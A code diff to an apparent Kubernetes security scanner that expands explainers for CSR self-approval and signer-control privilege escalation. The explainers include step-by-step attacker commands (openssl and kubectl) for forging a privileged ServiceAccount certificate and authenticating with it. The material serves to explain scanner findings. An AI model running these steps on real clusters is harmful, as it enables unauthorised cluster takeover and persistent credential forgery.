@@ -215,7 +215,7 @@ var Glossary = map[string]GlossaryEntry{
 	"CertificateSigningRequest": {
 		Title:  "CertificateSigningRequest",
 		Short:  "API resource for requesting a signed client / serving certificate from the cluster CA.",
-		Long:   template.HTML(`<p>A <strong>CertificateSigningRequest</strong> (CSR) carries an x509 signing request that asks the cluster's CA to issue a certificate. The signer is named via <code>spec.signerName</code> (e.g. <code>kubernetes.io/kube-apiserver-client</code> for API authentication, <code>kubernetes.io/kubelet-serving</code> for node serving certs). The CSR's Subject DN is attacker-controlled: the <code>CN</code> becomes the authenticated User and each <code>O</code> (Organization) becomes a Group.</p><p>Two RBAC verbs control the lifecycle: <code>create</code> on <code>certificatesigningrequests</code> lets you submit a CSR, and <code>update</code>/<code>patch</code> on the <code>certificatesigningrequests/approval</code> subresource lets you mark it Approved. The kube-controller-manager then signs whatever was approved. Holding both verbs is equivalent to cluster-admin: submit a CSR with <code>O=system:masters</code>, self-approve, retrieve the signed cert, and authenticate as <code>system:masters</code> (which the apiserver hard-codes as cluster-admin). Cert lifetime is whatever the signer applies (often a year), and revoking the original RBAC grant does not invalidate already-issued certs.</p>`),
+		Long:   template.HTML(`<p>A <strong>CertificateSigningRequest</strong> (CSR) carries an x509 signing request that asks the cluster's CA to issue a certificate. The signer is named via <code>spec.signerName</code> (e.g. <code>kubernetes.io/kube-apiserver-client</code> for API authentication, <code>kubernetes.io/kubelet-serving</code> for node serving certs). The CSR's Subject DN is chosen by whoever submits it: the <code>CN</code> becomes the authenticated User and each <code>O</code> (Organization) becomes a Group. The apiserver applies that mapping to <em>any</em> certificate signed by a CA in its <code>--client-ca-file</code> — it never asks whether the identity in the certificate is one Kubernetes would have issued. Kubernetes never issues a certificate to a ServiceAccount, yet a cert with <code>CN=system:serviceaccount:kube-system:&lt;sa&gt;</code> authenticates as exactly that ServiceAccount and inherits its bindings.</p><p>Four RBAC grants control the lifecycle, in two pairs. <em>Approving</em> needs <code>update</code>/<code>patch</code> on <code>certificatesigningrequests/approval</code> <em>and</em> the <code>approve</code> verb on the CSR's <code>signers</code> resource (enforced by the CertificateApproval admission plugin since 1.19); the kube-controller-manager then signs whatever was approved. <em>Signing</em> needs the <code>sign</code> verb on <code>signers</code> plus <code>update</code> on <code>certificatesigningrequests/status</code>, which is how a signer writes the issued certificate back. Whoever holds a full pair is effectively a cluster admin.</p><p>One nuance decides whether a given attempt works: the CertificateSubjectRestriction admission plugin (default-on since 1.19) rejects <code>kubernetes.io/kube-apiserver-client</code> CSRs that name <code>system:masters</code> as an Organization, so the textbook attack fails on modern clusters — but nothing restricts the Common Name, so claiming a privileged ServiceAccount or control-plane user still works. Cert lifetime is whatever the signer applies (often a year), Kubernetes publishes no CRL or OCSP, and revoking the RBAC grant does not invalidate an already-issued cert: only a CA rotation does.</p>`),
 		DocURL: "https://kubernetes.io/docs/reference/access-authn-authz/certificate-signing-requests/",
 	},
 	// Cloud-provider entries (EKS / AWS). Surface IAM concepts that show up as
@@ -369,15 +369,28 @@ var Techniques = map[string]TechniqueExplainer{
 		Mitre: "T1611 — Escape to Host",
 	},
 	"csr_approve": {
-		Title: "CSR self-approval to system:masters",
-		Plain: template.HTML(`<p>The combination of <code>create</code> on <code>certificatesigningrequests</code> AND <code>update</code>/<code>patch</code> on <code>certificatesigningrequests/approval</code> at cluster scope lets the holder mint a kubelet-signed x509 client cert carrying any Subject DN they choose. Setting the Organization to <code>system:masters</code> produces a credential that the apiserver authorizes as cluster-admin regardless of RBAC.</p><p>This is a permanent backdoor primitive: the cert validity is whatever the signer applies (often a year), and revoking the original RBAC grant does not invalidate it — only a CA rotation does. The Kubernetes project lists this in RBAC Good Practices as a privilege-escalation risk on par with direct <code>impersonate</code>.</p>`),
+		Title: "CSR self-approval: forging a cluster identity",
+		Plain: template.HTML(`<p>The combination of <code>create</code> on <code>certificatesigningrequests</code> AND <code>update</code>/<code>patch</code> on <code>certificatesigningrequests/approval</code> at cluster scope lets the holder have the cluster CA sign an x509 client cert carrying any Subject DN they choose. The apiserver maps the certificate's <code>CN</code> onto the username it authorizes and each <code>O</code> onto a group, for any cert signed by a CA in <code>--client-ca-file</code>. It never checks whether that identity is one Kubernetes would have issued — so <code>CN=system:serviceaccount:kube-system:&lt;sa&gt;</code> authenticates as that ServiceAccount even though Kubernetes itself never issues certificates to ServiceAccounts.</p><p>Pick the claim carefully. <code>O=system:masters</code> is the famous version and the one modern clusters block: CertificateSubjectRestriction (default-on since 1.19) rejects that Organization for the <code>kubernetes.io/kube-apiserver-client</code> signer. The Common Name is unrestricted, so the route that works is claiming an existing privileged identity — a kube-system ServiceAccount such as <code>clusterrole-aggregation-controller</code>, or a control-plane user like <code>system:kube-controller-manager</code>.</p><p>Note the second gate on the approval side: since 1.19 the CertificateApproval admission plugin also requires the approver to hold the <code>approve</code> verb on the CSR's <code>signers</code> resource. A subject with only the two CSR verbs has a latent escalation that goes live the moment the signer verb is added or the plugin is disabled.</p><p>This is a permanent backdoor primitive: cert validity is whatever the signer applies (often a year), Kubernetes has no revocation list, and removing the RBAC grant does not invalidate an issued cert — only a CA rotation does.</p>`),
 		Mitre: "T1098.001 — Account Manipulation: Additional Cloud Credentials",
 		AttackerSteps: []AttackerStep{
-			{Note: "Generate a private key and CSR locally with system:masters in the Subject", Cmd: "openssl req -new -newkey rsa:2048 -nodes -keyout admin.key -subj '/CN=attacker/O=system:masters' -out admin.csr"},
-			{Note: "Submit the CSR to the kube-apiserver-client signer", Cmd: "kubectl apply -f - <<EOF\napiVersion: certificates.k8s.io/v1\nkind: CertificateSigningRequest\nmetadata: {name: takeover}\nspec:\n  request: $(base64 -w0 admin.csr)\n  signerName: kubernetes.io/kube-apiserver-client\n  usages: [client auth]\nEOF"},
+			{Note: "Pick a privileged identity to claim (kube-system SAs are bound to powerful ClusterRoles)", Cmd: "kubectl get clusterrolebindings -o json | jq -r '.items[] | select(.roleRef.name==\"cluster-admin\") | .subjects[]?'"},
+			{Note: "Generate a key + CSR whose CN names that identity (avoid O=system:masters: CertificateSubjectRestriction blocks it)", Cmd: "openssl req -new -newkey rsa:2048 -nodes -keyout steal.key -subj '/CN=system:serviceaccount:kube-system:clusterrole-aggregation-controller' -out steal.csr"},
+			{Note: "Submit the CSR to the kube-apiserver-client signer", Cmd: "kubectl apply -f - <<EOF\napiVersion: certificates.k8s.io/v1\nkind: CertificateSigningRequest\nmetadata: {name: takeover}\nspec:\n  request: $(base64 -w0 steal.csr)\n  signerName: kubernetes.io/kube-apiserver-client\n  usages: [client auth]\nEOF"},
 			{Note: "Self-approve the CSR", Cmd: "kubectl certificate approve takeover"},
-			{Note: "Extract the signed cert", Cmd: "kubectl get csr takeover -o jsonpath='{.status.certificate}' | base64 -d > admin.crt"},
-			{Note: "Use it as cluster-admin", Cmd: "kubectl --client-certificate=admin.crt --client-key=admin.key get secrets -A"},
+			{Note: "Extract the signed cert", Cmd: "kubectl get csr takeover -o jsonpath='{.status.certificate}' | base64 -d > steal.crt"},
+			{Note: "Authenticate as the forged identity", Cmd: "kubectl --client-certificate=steal.crt --client-key=steal.key auth whoami"},
+		},
+	},
+	"csr_sign": {
+		Title: "Signer control: issuing certs without approval",
+		Plain: template.HTML(`<p>The <code>sign</code> verb on the <code>signers</code> resource plus <code>update</code>/<code>patch</code> on <code>certificatesigningrequests/status</code> is the authorization Kubernetes defines for <em>being</em> a certificate signer: the CertificateSigning admission plugin checks <code>sign</code> when a status write populates <code>status.certificate</code>. Where CSR self-approval asks the cluster's signer to issue a cert, this identity <em>is</em> the signer — no <code>create</code>, no <code>/approval</code>, and no approver anywhere in the chain.</p><p>For <code>kubernetes.io/kube-apiserver-client</code> that means issuing a client certificate for any identity the holder names. For the kubelet signers it means minting node identities (<code>CN=system:node:&lt;name&gt;</code>), which the Node authorizer accepts for every object bound to that node.</p><p>One condition decides urgency: a certificate only authenticates if it chains to a CA in the apiserver's <code>--client-ca-file</code>. This grant designates the holder as the signer, and a real signer holds that CA key by definition. So the question is whether this identity is supposed to be a certificate authority for cluster identities — true for the controller-manager or a purpose-built signer controller, never true for an application ServiceAccount.</p>`),
+		Mitre: "T1098.001 — Account Manipulation: Additional Cloud Credentials",
+		AttackerSteps: []AttackerStep{
+			{Note: "Confirm the pair (signer verb + status write)", Cmd: "kubectl auth can-i --list --as=system:serviceaccount:<ns>:<sa> | grep -E 'signers|certificatesigningrequests/status'"},
+			{Note: "Locate the signing CA key the role implies (workload mount, or control-plane node)", Cmd: "kubectl get pod <pod> -o jsonpath='{.spec.volumes}' | jq"},
+			{Note: "Submit a CSR for the controlled signer claiming a privileged CN, then sign it offline with that CA key", Cmd: "openssl x509 -req -in minted.csr -CA signer-ca.crt -CAkey signer-ca.key -days 365 -out minted.crt"},
+			{Note: "Write the issued cert back yourself — no approver is consulted", Cmd: "kubectl patch csr minted --subresource=status --type=merge -p \"{\\\"status\\\":{\\\"certificate\\\":\\\"$(base64 -w0 minted.crt)\\\"}}\""},
+			{Note: "Authenticate as the forged identity", Cmd: "kubectl --client-certificate=minted.crt --client-key=minted.key auth whoami"},
 		},
 	},
 	"pod_host_escape": {
@@ -603,6 +616,13 @@ func TechniqueKeyForFinding(f models.Finding) string {
 		return "modify_role_binding"
 	case f.RuleID == "KUBE-PRIVESC-011":
 		return "csr_approve"
+	case f.RuleID == "KUBE-PRIVESC-024":
+		return "csr_sign"
+	case f.RuleID == "KUBE-CSR-001", f.RuleID == "KUBE-CSR-002":
+		// The CSR-object rules are evidence that the certificates path was used,
+		// not a permission to use it, but the technique copy is the same one a
+		// reader needs to understand what an issued client cert buys an attacker.
+		return "csr_approve"
 	case f.RuleID == "KUBE-PRIVESC-012":
 		return "nodes_proxy"
 	case f.RuleID == "KUBE-PRIVESC-014":
@@ -663,7 +683,8 @@ func GlossaryKeyForResource(ref *models.ResourceRef) string {
 	switch ref.Kind {
 	case "Pod", "Deployment", "DaemonSet", "StatefulSet", "ReplicaSet", "Job",
 		"Secret", "ConfigMap", "Namespace", "PersistentVolume",
-		"ClusterRole", "ClusterRoleBinding", "Role", "RoleBinding":
+		"ClusterRole", "ClusterRoleBinding", "Role", "RoleBinding",
+		"CertificateSigningRequest":
 		return ref.Kind
 	}
 	return ""
